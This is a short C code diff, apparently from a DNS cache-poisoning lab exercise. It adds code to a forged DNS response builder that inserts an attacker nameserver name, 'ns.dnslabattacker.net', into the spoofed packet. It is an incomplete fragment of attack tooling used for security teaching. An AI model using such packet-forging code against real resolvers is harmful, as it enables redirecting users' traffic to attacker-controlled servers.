@@ -334,5 +334,8 @@ void responsePacket(char *dns_data, char *src_addr, char *dest_add){
     nssend->ttl_h = htons(0xD0);
     nssend->datalen = htons(23);
     
+    char *nsname = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct ansEnd) + nslength);
+    strcpy(nsname, "\2ns\16dnslabattacker\3net");
+    int nsnamelen = strlen(nsname) + 1;
 }
 ```
